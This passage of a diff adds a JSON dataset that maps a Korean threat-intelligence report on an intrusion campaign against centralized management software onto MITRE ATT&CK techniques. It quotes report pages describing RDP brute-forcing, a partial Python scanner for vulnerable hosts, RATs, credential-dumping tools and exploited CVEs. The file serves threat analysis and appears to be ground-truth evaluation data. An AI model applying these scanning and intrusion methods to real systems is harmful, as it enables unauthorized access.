@@ -1,0 +1,2199 @@
+{
+  "meta": {
+    "generated_at": "2026-06-06T07:07:37",
+    "total_nodes": 29,
+    "total_facts": 32,
+    "total_combines": 14,
+    "has_images": true,
+    "gt_file": "kisa_ttps11_ground_truth.json",
+    "gt_mitre_version": "15.1"
+  },
+  "gt_validation": {
+    "in_node_not_gt": [],
+    "in_gt_not_node": [],
+    "name_mismatches": []
+  },
+  "nodes": [
+    {
+      "node_id": "N16",
+      "tactic": "Reconnaissance",
+      "technique_id": "T1595.003",
+      "technique_name": "Active Scanning: Wordlist Scanning",
+      "behavior_summary": "임대업체 기본 RDP 비밀번호 패턴으로 임대 서버 IP 대역 무작위 대입",
+      "relationships": "obtains(F30 → F23)",
+      "report_pages": [
+        {
+          "page_number": 4,
+          "text": "공격자는 이번 공격을 수행하기 위해 특정 국내 서버를 임대하였다. 이 임대 업체는 고객에게 서버\n를 제공할 때 특정한 패턴을 따르는 기본 RDPRemote Desktop Protocol) 접속 비밀번호를 설정\n한다. 이러한 패턴을 알고 있던 공격자는 이를 이용하여 임대받은 서버의 IP 대역을 대상으로 무작\n위 대입 공격을 실행하였다.\n임대서버의 기본 계정정보를 이용한 무작위 대입공격\n공격자의 메일에서 발견된 임대서버의 기본 패스워드\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 4"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Active Scanning: Wordlist Scanning"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C12",
+          "operator": "AND",
+          "label": "임대 서버 무작위 대입 공격에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F29",
+              "name": "attacker.rental_server.ip_range",
+              "description": "무작위 대입 대상 임대 서버 IP 대역",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F30",
+              "name": "attacker.rdp.default_password_pattern",
+              "description": "임대업체가 설정하는 기본 RDP 비밀번호 패턴",
+              "is_external": true,
+              "level": "report_explicit",
+              "inferred_flag": false
+            }
+          ]
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F23",
+          "name": "attacker.rental_server.credential",
+          "description": "무작위 대입으로 확보한 임대 서버 접속 계정"
+        }
+      ]
+    },
+    {
+      "node_id": "N17",
+      "tactic": "Reconnaissance",
+      "technique_id": "T1596.005",
+      "technique_name": "Search Open Technical Databases: Scan Databases",
+      "behavior_summary": "Shodan으로 목표 네트워크 구조·취약점·기기 정보 수집",
+      "relationships": "enumerates(— → F24)",
+      "report_pages": [
+        {
+          "page_number": 5,
+          "text": "무작위 대입공격에 사용된 Dictionary\nSearch Open Technical Databases: Scan Databases\n공격자는 초기에 'Shodan'이라는 스캐닝 서비스 사이트를 사용하여 목표 기업의 정보를 수집했다.\n이를 통해 목표 기업의 네트워크 구조, 보안 취약점, 사용 중인 기기 등의 정보를 파악하였다. 이 정\n보는 공격 계획을 세우는데 필요한 자료로 활용되었다. 그러나 Shodan 서비스만으로는 필요한 정\n보를 모두 수집하기 어려웠기 때문에, 공격자는 직접 스캐닝 코드를 개발하기도 하였다.\nActive Scanning: Vulnerability Scanning\n공격자는 국내의 소프트웨어 제품에 대한 제로데이 취약점을 다수 가지고 있음이 확인되었다. 이러\n한 취약점을 효과적으로 활용하기 위해, 공격자는 파이썬 프로그래밍 언어를 사용하여 스캐닝 코드\n를 작성하였다. 이 코드는 취약점을 가진 소프트웨어가 구동되고 있는 시스템을 찾아내는 역할을 수\n행한다.\nimport sys\nimport requests\ndef process_ip_list(ip_list_file, output_file):\nwith open(ip_list_file, 'r') as file:\nfor i, ip in enumerate(file, start=1):\n개행 문자 제거\nip = ip.strip() #\n제품명\nurl = f\"https://{ip}:8660/[ ]/ServerRequest/HealthC\ntry:\nresponse = requests.get(url, timeout=5, verify = F\n제품명\nif \"[ ]\" in response.text:\nwrite_to_file(output_file, ip)\nprint(f\"{i}. {ip} +++++\")\nelse:\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 5"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Search Open Technical Databases: Scan Databases"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F24",
+          "name": "target.recon.shodan_info",
+          "description": "Shodan으로 수집한 목표 네트워크·기기·취약점 정보"
+        }
+      ]
+    },
+    {
+      "node_id": "N18",
+      "tactic": "Reconnaissance",
+      "technique_id": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "behavior_summary": "Python 스캐닝 코드로 취약 SW 시스템·엔드포인트 탐색(:8660/[제품명]/ServerRequest/HealthCheck)",
+      "relationships": "enumerates(— → F01), enumerates(— → F02)",
+      "report_pages": [
+        {
+          "page_number": 6,
+          "text": "print(f\"{i}. {ip}\")\nexcept requests.exceptions.RequestException as e:\nprint(f\"{i}. {ip}\")\ndef write_to_file(file, content):\nwith open(file, 'a') as f:\nf.write(content + '\\n')\nif __name__ == \"__main__\":\nif len(sys.argv) != 3:\nprint(\"Usage: python program.py ip_list_file output_file\")\nelse:\nip_list_file = sys.argv[1]\noutput_file = sys.argv[2]\nprocess_ip_list(ip_list_file, output_file)\nSearch Open Websites/Domains: Search Engines\n공격자는 구글 검색 엔진을 활용하여 다양한 정보를 탐색하였다. 이 과정에서 영어와 한국어를 혼합\n하여 검색어를 입력하였다. 이는 공격자가 다양한 언어를 사용하여 정보를 수집하려 노력한 것으로\n보인다. 또한 공격자의 브라우저 언어 설정이 중국어로 되어 있었는데, 이는 공격자가 중국어를 사\n용하는 지역에서 활동하거나 중국어를 이해할 수 있다는 점을 시사한다.\n임대서버에서 사용한 브라우저\n공격자가 사용한 검색어 중 일부는 네이버나 카카오톡 같은 국내 서비스의 휴대폰 인증을 우회하려\n는 시도를 보여준다. 또한, 그들이 일으킨 침해사고에 대한 분석 보고서를 검색하는 활동도 진행하\n고 있다. 이러한 검색 활동 분석을 통해 공격자의 관심사나 목표를 파악할 수 있다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 6"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Active Scanning: Vulnerability Scanning"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F01",
+          "name": "target.host.ip",
+          "description": "스캐닝으로 식별된 외부 노출 피해 호스트 IP"
+        },
+        {
+          "fact_id": "F02",
+          "name": "target.management_solution.endpoint",
+          "description": "외부에 포트가 열린 중앙 관리 솔루션 콘솔/오픈 DB 포트"
+        }
+      ]
+    },
+    {
+      "node_id": "N19",
+      "tactic": "Reconnaissance",
+      "technique_id": "T1593.002",
+      "technique_name": "Search Open Websites/Domains: Search Engines",
+      "behavior_summary": "구글 검색(인증 우회·키로깅 등 부가 정보 수집)",
+      "relationships": "enumerates(— → F25)",
+      "report_pages": [
+        {
+          "page_number": 7,
+          "text": "아래에는 공격자가 Chrome 브라우저를 통해 입력한 검색어들을 나열했다.\n목적 검색어\n네이버 폰인증하기\n네이버 회원가입 방법\n네이버 가입을 위한 검색 네이버 회원가입 시 인증번호 안 올 때 해결\n네이버 휴대폰없이 가입\n네이버 아이디 무제한으로 만드는 방법\n카카오톡 가입을 위한 검색 kakaotalk logins\n가상 번호를 사용하기 위한 검색 virtual SMS\n사내, 비번, 비밀번호, 정보, svn, 원격, 서버, 팀뷰어, 접근, 접속, 전\n침투한 서버 내에서 정보 검색 산, 시스템, 사내망, 사내, ip, domain, 도메일, 패스워드, 인터넷, 계\n정\n패스워드 파일로 위장하여 유포중인 악성코드- ASEC BLOG\n자산관리 프로그램을 악용한 공격 정황 포착 (Andariel 그룹) -\n보안 블로그 접속\nASEC BLOG\n20231101_kimsuky_OP.Covert-Stalker.pdf\n키로깅 방법 검색 how to keylog when logonui.exe is run\nResource Development\nAcquire Infrastructure: Server\n공격자는 국내 피해업체를 공격하고 데이터를 탈취하기 위해 국내 호스팅 업체의 서버를 임대하여\n사용하였다.\n공격자는 서버를 임대할 기업을 정할 때 신분노출을 최소화하기 위해 가상자산으로 결제 가능한 곳\n을 선정하였다.\nAcquire Infrastructure: Virtual Private Server\n공격을 수행하는 동안 실제 위치를 숨기기 위해 공격자들은 종종 가상사설서버(VPS)를 사용한다.\n이번 사례에서도 공격자는 자신의 실제 IP 주소를 감추기 위해 VPS 서비스를 가입하고 사용한 흔\n적을 확인하였다. 분석 결과, 공격자는 주로 Vultr 호스팅 서비스를 이용하였음을 확인하였다.\nVultr 서비스 지불 로그\nDevelop Capabilities: Malware\n공격자는 원격제어 악성코드, 취약점 스캐너, 무작위 대입 공격 코드 등 다양한 도구를 활용하여 공\n격을 수행하였다. 공격자는 이번 오퍼레이션을 수행하기 위하여 공개된 해킹도구를 사용함과 동시\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 7"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Search Open Websites/Domains: Search Engines"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F25",
+          "name": "attacker.recon.search_info",
+          "description": "구글 검색으로 수집한 인증우회·키로깅 등 정보"
+        }
+      ]
+    },
+    {
+      "node_id": "N20",
+      "tactic": "Resource Development",
+      "technique_id": "T1583.004",
+      "technique_name": "Acquire Infrastructure: Server",
+      "behavior_summary": "국내 호스팅 서버를 가상자산 결제로 임대",
+      "relationships": "obtains(— → F21)",
+      "report_pages": [
+        {
+          "page_number": 7,
+          "text": "아래에는 공격자가 Chrome 브라우저를 통해 입력한 검색어들을 나열했다.\n목적 검색어\n네이버 폰인증하기\n네이버 회원가입 방법\n네이버 가입을 위한 검색 네이버 회원가입 시 인증번호 안 올 때 해결\n네이버 휴대폰없이 가입\n네이버 아이디 무제한으로 만드는 방법\n카카오톡 가입을 위한 검색 kakaotalk logins\n가상 번호를 사용하기 위한 검색 virtual SMS\n사내, 비번, 비밀번호, 정보, svn, 원격, 서버, 팀뷰어, 접근, 접속, 전\n침투한 서버 내에서 정보 검색 산, 시스템, 사내망, 사내, ip, domain, 도메일, 패스워드, 인터넷, 계\n정\n패스워드 파일로 위장하여 유포중인 악성코드- ASEC BLOG\n자산관리 프로그램을 악용한 공격 정황 포착 (Andariel 그룹) -\n보안 블로그 접속\nASEC BLOG\n20231101_kimsuky_OP.Covert-Stalker.pdf\n키로깅 방법 검색 how to keylog when logonui.exe is run\nResource Development\nAcquire Infrastructure: Server\n공격자는 국내 피해업체를 공격하고 데이터를 탈취하기 위해 국내 호스팅 업체의 서버를 임대하여\n사용하였다.\n공격자는 서버를 임대할 기업을 정할 때 신분노출을 최소화하기 위해 가상자산으로 결제 가능한 곳\n을 선정하였다.\nAcquire Infrastructure: Virtual Private Server\n공격을 수행하는 동안 실제 위치를 숨기기 위해 공격자들은 종종 가상사설서버(VPS)를 사용한다.\n이번 사례에서도 공격자는 자신의 실제 IP 주소를 감추기 위해 VPS 서비스를 가입하고 사용한 흔\n적을 확인하였다. 분석 결과, 공격자는 주로 Vultr 호스팅 서비스를 이용하였음을 확인하였다.\nVultr 서비스 지불 로그\nDevelop Capabilities: Malware\n공격자는 원격제어 악성코드, 취약점 스캐너, 무작위 대입 공격 코드 등 다양한 도구를 활용하여 공\n격을 수행하였다. 공격자는 이번 오퍼레이션을 수행하기 위하여 공개된 해킹도구를 사용함과 동시\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 7"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Acquire Infrastructure: Server"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F21",
+          "name": "attacker.rental_server.host",
+          "description": "가상자산 결제로 임대한 국내 호스팅 서버"
+        }
+      ]
+    },
+    {
+      "node_id": "N21",
+      "tactic": "Resource Development",
+      "technique_id": "T1583.003",
+      "technique_name": "Acquire Infrastructure: Virtual Private Server",
+      "behavior_summary": "실제 IP 은닉을 위해 Vultr VPS 사용",
+      "relationships": "obtains(— → F22)",
+      "report_pages": [
+        {
+          "page_number": 7,
+          "text": "아래에는 공격자가 Chrome 브라우저를 통해 입력한 검색어들을 나열했다.\n목적 검색어\n네이버 폰인증하기\n네이버 회원가입 방법\n네이버 가입을 위한 검색 네이버 회원가입 시 인증번호 안 올 때 해결\n네이버 휴대폰없이 가입\n네이버 아이디 무제한으로 만드는 방법\n카카오톡 가입을 위한 검색 kakaotalk logins\n가상 번호를 사용하기 위한 검색 virtual SMS\n사내, 비번, 비밀번호, 정보, svn, 원격, 서버, 팀뷰어, 접근, 접속, 전\n침투한 서버 내에서 정보 검색 산, 시스템, 사내망, 사내, ip, domain, 도메일, 패스워드, 인터넷, 계\n정\n패스워드 파일로 위장하여 유포중인 악성코드- ASEC BLOG\n자산관리 프로그램을 악용한 공격 정황 포착 (Andariel 그룹) -\n보안 블로그 접속\nASEC BLOG\n20231101_kimsuky_OP.Covert-Stalker.pdf\n키로깅 방법 검색 how to keylog when logonui.exe is run\nResource Development\nAcquire Infrastructure: Server\n공격자는 국내 피해업체를 공격하고 데이터를 탈취하기 위해 국내 호스팅 업체의 서버를 임대하여\n사용하였다.\n공격자는 서버를 임대할 기업을 정할 때 신분노출을 최소화하기 위해 가상자산으로 결제 가능한 곳\n을 선정하였다.\nAcquire Infrastructure: Virtual Private Server\n공격을 수행하는 동안 실제 위치를 숨기기 위해 공격자들은 종종 가상사설서버(VPS)를 사용한다.\n이번 사례에서도 공격자는 자신의 실제 IP 주소를 감추기 위해 VPS 서비스를 가입하고 사용한 흔\n적을 확인하였다. 분석 결과, 공격자는 주로 Vultr 호스팅 서비스를 이용하였음을 확인하였다.\nVultr 서비스 지불 로그\nDevelop Capabilities: Malware\n공격자는 원격제어 악성코드, 취약점 스캐너, 무작위 대입 공격 코드 등 다양한 도구를 활용하여 공\n격을 수행하였다. 공격자는 이번 오퍼레이션을 수행하기 위하여 공개된 해킹도구를 사용함과 동시\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 7"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Acquire Infrastructure: Virtual Private Server"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F22",
+          "name": "attacker.vps.host",
+          "description": "실제 IP 은닉용 Vultr VPS"
+        }
+      ]
+    },
+    {
+      "node_id": "N22",
+      "tactic": "Resource Development",
+      "technique_id": "T1587.001",
+      "technique_name": "Develop Capabilities: Malware",
+      "behavior_summary": "Golang 신종 등 악성코드 직접 개발(main.go, go-memexec 참조)",
+      "relationships": "creates(F31 → F05)",
+      "report_pages": [
+        {
+          "page_number": 8,
+          "text": "에 기존에 사용하지 않았던 신종 악성코드를 개발, 활용하는 모습을 보였다. 특히 이전과 달리, 기존\n부터 활용하던 악성코드 대비 신종 악성코드를 사용하는 비율이 월등히 높은 모습을 보인다.\n공격자는 C/C, .NET 악성코드에 더하여 Golang으로 작성한 악성코드를 적극적으로 개발, 사\n용하고 있으며 그 비율은 더 높아지고 있다. 이는 Golang의 개발 편의성과 더불어 동일코드로 멀티\n플랫폼 환경에서의 동작을 지원한다는 특수성으로 보인다. 따라서, 향후 리눅스나 맥 환경에서 동작\n하는 Golang 악성코드를 해당 공격그룹이 사용할 것이며, 공격타겟 또한 넓어질 것을 내포한다.\nRDPRemote Desktop Protocol) 캐시의 일부에서는 main.go라는 파일명의 코드를 개발 중인\n모습을 확인하였다. 이는 공격자가 직접 코드를 개발하고 있음을 나타낸다.\nmain.go 코드 개발 정황\n공격자들은 이러한 도구 개발을 위해 여러 자료를 참조하였다. 특히, Go 언어로 된 악성 코드를 개\n발하기 위해 공개된 GitHub 저장소를 참조하였으며, 제작한 악성 코드가 탐지되지 않도록 하기 위\n해 메모리에서 실행되는 기법에 대해 검색하였다.\nGitHub의 go-memexec 접속 기록\n마찬가지로 공격자들은 효과적인 공격 수행을 위해 Dll Injection 기법에 대한 테스트를 진행하였\n다. 이 기법은 악성 코드를 대상 프로세스의 메모리 공간에 삽입하여 실행하는 방법으로, 공격자가\n시스템을 더욱 깊숙히 조종할 수 있게 해준다.\nDLL Injection 테스트 파일\nDevelop Capabilities: Exploits\n해당 공격 그룹은 국내 소프트웨어의 제로데이 취약점에 대해 많은 연구를 진행하였다. 취약점 테스\n트의 대상이 된 소프트웨어는 주로 자산 관리 솔루션, 문서 관리 솔루션, 패치 관리 솔루션 등의 중\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 8"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Develop Capabilities: Malware"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F31",
+          "name": "attacker.dev.reference",
+          "description": "악성코드 개발 참조 자료(GitHub go-memexec 등)",
+          "is_external": true,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F05",
+          "name": "attacker.malware.binary",
+          "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)"
+        }
+      ]
+    },
+    {
+      "node_id": "N23",
+      "tactic": "Resource Development",
+      "technique_id": "T1587.004",
+      "technique_name": "Develop Capabilities: Exploits",
+      "behavior_summary": "피해 기업서 확보한 솔루션 소스코드로 제로데이 취약점 연구·개발",
+      "relationships": "creates(F32 → F03)",
+      "report_pages": [
+        {
+          "page_number": 9,
+          "text": "앙 집중형 관리 솔루션들이었다. 이런 솔루션들은 대부분 웹 기반의 UI를 가지고 있어, 침해한 서버\n로부터 소스 코드를 쉽게 확보할 수 있다. 따라서 공격자는 침투에 성공한 피해 기업으로부터 솔루\n션의 코드를 확보한 후, 임대 서버에 설치하여 취약점 테스트 및 개발을 진행할 수 있었다.\n중앙 집중형 관리 솔루션은 내부 시스템들에 파일 배포 및 실행이 가능하여 악성코드의 내부 전파를\n쉽게 할 수 있다. 따라서, 이러한 솔루션들이 더욱 주요한 공격 대상이었을 것이다.\n중앙 집중형 관리 솔루션의 취약점 개발 과정\nObtain Capabilities: Malware\n공격을 수행하기 위해 필요한 도구들이 각 임대서버에서 발견되었다. 이러한 도구들의 사용 목적은\n다양하며, 원격제어부터 웹페이지 구축, 웹 침투 테스트, 네트워크 트래픽 모니터링, 코드 개발, 가\n상머신 운영 등의 기능을 수행하였다. 이렇게 공격자의 임대 서버에서 발견된 다양한 도구들은 공격\n자의 공격 방법론과 전략을 이해하는 데 중요한 단서를 제공한다.\n로그에서 확인된 사용\n도구 기능\n목적\n무작위 대입 공격에 사\nWebPageLogin_BruteForce 무작위 대입 공격\n용\n무작위 대입 공격에 사\nTITAN_PRIVAT 무작위 대입 공격\n용\n무작위 대입 공격에 사\nMassscan 무작위 대입 공격\n용\n피해 시스템 제어에 사\nAmmyRAT 원격제어\n용\nVenomRat 원격제어 피해시스템 제어에 사용\nWarzoneRat 원격제어 피해시스템 제어에 사용\n图形化渗透测试武器库 모의해킹 도구 -\n(Graphica Penetration Testing\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 9"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Develop Capabilities: Exploits"
+      },
+      "requirements": [
+        {
+          "type": "fact",
+          "fact_id": "F32",
+          "name": "target.solution.source_code",
+          "description": "피해 기업서 확보한 중앙관리 솔루션 소스코드",
+          "is_external": true,
+          "level": "report_explicit",
+          "inferred_flag": false
+        }
+      ],
+      "parsers": [
+        {
+          "fact_id": "F03",
+          "name": "attacker.exploit.code",
+          "description": "침투용 공개 CVE·제로데이 익스플로잇(CVE-2023-42793 등)"
+        }
+      ]
+    },
+    {
+      "node_id": "N24",
+      "tactic": "Resource Development",
+      "technique_id": "T1588.001",
+      "technique_name": "Obtain Capabilities: Malware",
+      "behavior_summary": "공개 악성코드(AmmyRAT·VenomRat·WarzoneRat 등) 확보",
+      "relationships": "obtains(— → F05)",
+      "report_pages": [
+        {
+          "page_number": 10,
+          "text": "로그에서 확인된 사용\n도구 기능\n목적\nWeapon Library)\nNetsarang Xshell에 저장된\nXdecrypt -\nCredential을 추출\nObtain Capabilities: Exploits\n임대서버에서 발견된 공격자가 사용한 공개된 취약점 코드는 아래와 같다. 공격자들이 Windows\n용 소프트웨어와 Linux용 소프트웨어의 취약점을 모두 활용하고 있음으로써, 운영 체제를 구분하\n지 않고 다양한 시스템을 대상으로 공격하고 있다는 것을 알 수 있다.\n도구 기능 로그에서 확인된 사용 목적\nWindows Print Spooler 서비스의 권한상승 취\nPrintSpoofer 피해 시스템 공격에 사용\n약점\nCVE2023 JetBrains Teamcity에서 발생하는 원격 코드 실\n피해 시스템 공격에 사용\n42793 행 취약점\nCVE2023 PaperCut MF 및 NG 소프트웨어에서 발행하는\n피해 시스템 공격에 사용\n27350 원격 코드 실행 취약점\nCVE2021 Zoho ManagerEngine ADSelfService Plus에\n피해 시스템 공격에 사용\n40539 서 발생하는 인증 우회 및 원격 코드실행 취약점\nCVE2023 Zoho ManagerEngine ADManager Plus에서\n피해 시스템 공격에 사용\n38743 발생하는 원격명령 실행 취약점\nCVE2023\nCraft CMS에서 발생하는 원격 코드 실행 취약점 피해 시스템 공격에 사용\n41892\nCVE2023 Atlassian Confluence Data Center와 Server\n피해 시스템 공격에 사용\n22515 에서 발생하는 접근제어 취약점\nCVE2023 OpenSSH의 ssh-agent 포워딩 기능에서 발생\n피해 시스템 공격에 사용\n38408 하는 원격 코드 실행 취약점\nObtain Capabilities: Tool\n공격자 임대서버에서 발견된 도구는 아래와 같다.\n도구 기능 로그에서 확인된 사용 목적\nSunlogin 원격제어 임대서버 제어에 사용\nPSEXESVC 원격제어 피해시스템 제어에 사용\nphpstudy 웹페이지 구축 -\nxampp 웹페이지 구축 피해기업의 자료유출에 사용\nAcunetix 웹 침투 테스트 -\nBurp Suite Professional 2022 v3.6 웹 침투 테스트 -\nWPS Office 중국 문서 프로그램 -\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 10"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Obtain Capabilities: Malware"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F05",
+          "name": "attacker.malware.binary",
+          "description": "개발·입수한 악성 바이너리(RAT 등, mscert.exe·game.exe)"
+        }
+      ]
+    },
+    {
+      "node_id": "N25",
+      "tactic": "Resource Development",
+      "technique_id": "T1588.005",
+      "technique_name": "Obtain Capabilities: Exploits",
+      "behavior_summary": "공개 취약점 코드(PrintSpoofer, CVE-2023-42793 등) 확보",
+      "relationships": "obtains(— → F03)",
+      "report_pages": [
+        {
+          "page_number": 10,
+          "text": "로그에서 확인된 사용\n도구 기능\n목적\nWeapon Library)\nNetsarang Xshell에 저장된\nXdecrypt -\nCredential을 추출\nObtain Capabilities: Exploits\n임대서버에서 발견된 공격자가 사용한 공개된 취약점 코드는 아래와 같다. 공격자들이 Windows\n용 소프트웨어와 Linux용 소프트웨어의 취약점을 모두 활용하고 있음으로써, 운영 체제를 구분하\n지 않고 다양한 시스템을 대상으로 공격하고 있다는 것을 알 수 있다.\n도구 기능 로그에서 확인된 사용 목적\nWindows Print Spooler 서비스의 권한상승 취\nPrintSpoofer 피해 시스템 공격에 사용\n약점\nCVE2023 JetBrains Teamcity에서 발생하는 원격 코드 실\n피해 시스템 공격에 사용\n42793 행 취약점\nCVE2023 PaperCut MF 및 NG 소프트웨어에서 발행하는\n피해 시스템 공격에 사용\n27350 원격 코드 실행 취약점\nCVE2021 Zoho ManagerEngine ADSelfService Plus에\n피해 시스템 공격에 사용\n40539 서 발생하는 인증 우회 및 원격 코드실행 취약점\nCVE2023 Zoho ManagerEngine ADManager Plus에서\n피해 시스템 공격에 사용\n38743 발생하는 원격명령 실행 취약점\nCVE2023\nCraft CMS에서 발생하는 원격 코드 실행 취약점 피해 시스템 공격에 사용\n41892\nCVE2023 Atlassian Confluence Data Center와 Server\n피해 시스템 공격에 사용\n22515 에서 발생하는 접근제어 취약점\nCVE2023 OpenSSH의 ssh-agent 포워딩 기능에서 발생\n피해 시스템 공격에 사용\n38408 하는 원격 코드 실행 취약점\nObtain Capabilities: Tool\n공격자 임대서버에서 발견된 도구는 아래와 같다.\n도구 기능 로그에서 확인된 사용 목적\nSunlogin 원격제어 임대서버 제어에 사용\nPSEXESVC 원격제어 피해시스템 제어에 사용\nphpstudy 웹페이지 구축 -\nxampp 웹페이지 구축 피해기업의 자료유출에 사용\nAcunetix 웹 침투 테스트 -\nBurp Suite Professional 2022 v3.6 웹 침투 테스트 -\nWPS Office 중국 문서 프로그램 -\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 10"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Obtain Capabilities: Exploits"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F03",
+          "name": "attacker.exploit.code",
+          "description": "침투용 공개 CVE·제로데이 익스플로잇(CVE-2023-42793 등)"
+        }
+      ]
+    },
+    {
+      "node_id": "N26",
+      "tactic": "Resource Development",
+      "technique_id": "T1588.002",
+      "technique_name": "Obtain Capabilities: Tool",
+      "behavior_summary": "공개 도구(Sunlogin·PSEXESVC·Acunetix 등) 확보",
+      "relationships": "obtains(— → F07)",
+      "report_pages": [
+        {
+          "page_number": 11,
+          "text": "도구 기능 로그에서 확인된 사용 목적\nObsidian 마크다운 에디터 -\nTypora 마크다운 에디터 -\nWireshark 네트워크 트래픽 모니터링 -\nProxifier 프록시 -\nv2rayN 프록시 -\nCCProxy 프록시 -\nSharpReverseProxy 리버스 프록시 -\nbore-v0.5.0 리버스 프록시 -\nloclx 리버스 프록시 -\nVisual Studio Code 코드 개발 -\nVisualGet 매크로 개발 -\nNavicat Premium 16 MySQL 관리 피해시스템 제어에 사용\n임대서버 내에 있는 데이터 보호\nVeraCrypt 디스크 암호화\n에 사용\n공격자끼리 연락에 사용\nTelegram 메신저\n데이터 유출에 사용\nQQ 메신저 공격자끼리 연락에 사용\nEveryThing 파일 검색 -\nMotrix 파일 다운로드 매니저 -\nInternet Download Manager 파일 다운로드 매니저 -\n취약점 테스트용 가상이미지 구\nVirtualBox 가상머신\n동에 사용\ngo-memexec 메모리 실행 라이브러리 악성코드 제작에 사용\nMemorySharp 메모리 편집 라이브러리 악성코드 제작에 사용\n시스템에 저장중인 패스워드(브\nProtected Storage PassView -\n라우져)를 출력\nInstant Messenger Password 메신저 애플리케이션의 사용자\n-\nRecovery Tool 계정 비밀번호를 복구\nDefense Evasion\nObfuscated Files or Information\n공격자는 공격을 위해 필요한 다양한 자원들을 보관하고 있는 특정 드라이브를 암호화하였다. 이 드\n라이브에는 공격에 필요한 해킹 도구, 원격제어 악성코드, 취약점 테스트용 가상머신 등 중요한 정\n보가 담겨 있었다.\n암호화에 사용된 도구는 VeraCrypt이라는 알려진 암호화 도구이다. 이 도구는 드라이브 전체를 효\n과적으로 암호화하여 외부의 접근을 차단하는데 사용된다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 11"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Obtain Capabilities: Tool"
+      },
+      "requirements": [],
+      "parsers": [
+        {
+          "fact_id": "F07",
+          "name": "attacker.tool.psexec",
+          "description": "입수한 PSEXEC/PSEXESVC 도구"
+        }
+      ]
+    },
+    {
+      "node_id": "N01",
+      "tactic": "Initial Access",
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "behavior_summary": "외부 노출 솔루션 제로데이·공개 CVE(또는 오픈 DB 포트 SA 무작위 대입+xp_cmdshell) 악용 침투",
+      "relationships": "exploits(F03 → F11)",
+      "report_pages": [
+        {
+          "page_number": 17,
+          "text": "소스코드 확보 및 취약점 개발\n두 번째로, 피해를 입은 업체에서 운영 중인 중앙관리형 솔루션들은 대부분 외부 인터넷에 프로그램\n의 포트가 열려있는 채로 방치되어 있었다. 따라서 공격자가 제작한 스캐닝 프로그램에 의해 포트가\n외부에 개방된 상태로 운영되고 있는 시스템들은 모두 침해를 당하였다.\n취약점 스캐닝\n세 번째로, 발견된 대부분의 제로데이 취약점은 인증 우회와 관련이 있었다. 관리자 권한 없이 계정\n정보가 담긴 파일에 접근이 가능하여 손쉽게 관리자 계정을 탈취한 경우도 있었고, 인증과정 없이\n계정을 생성하거나 명령 실행이 가능했던 경우도 있었다.\nTTPs #11 Operation An Octopus - 중앙 집중형 관리 솔루션을 노리는 공격전략 분석 17"
+        }
+      ],
+      "gt_check": {
+        "in_gt": true,
+        "name_match": true,
+        "gt_name": "Exploit Public-Facing Application"
+      },
+      "requirements": [
+        {
+          "type": "combine",
+          "combine_id": "C01",
+          "operator": "AND",
+          "label": "공개 취약점 기반 외부 노출 솔루션 초기 침투에 필요한 입력",
+          "members": [
+            {
+              "type": "fact",
+              "fact_id": "F01",
+              "name": "target.host.ip",
+              "description": "스캐닝으로 식별된 외부 노출 피해 호스트 IP",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
+            {
+              "type": "fact",
+              "fact_id": "F02",
+              "name": "target.management_solution.endpoint",
+              "description": "외부에 포트가 열린 중앙 관리 솔루션 콘솔/오픈 DB 포트",
+              "is_external": false,
+              "level": "report_explicit",
+              "inferred_flag": false
+            },
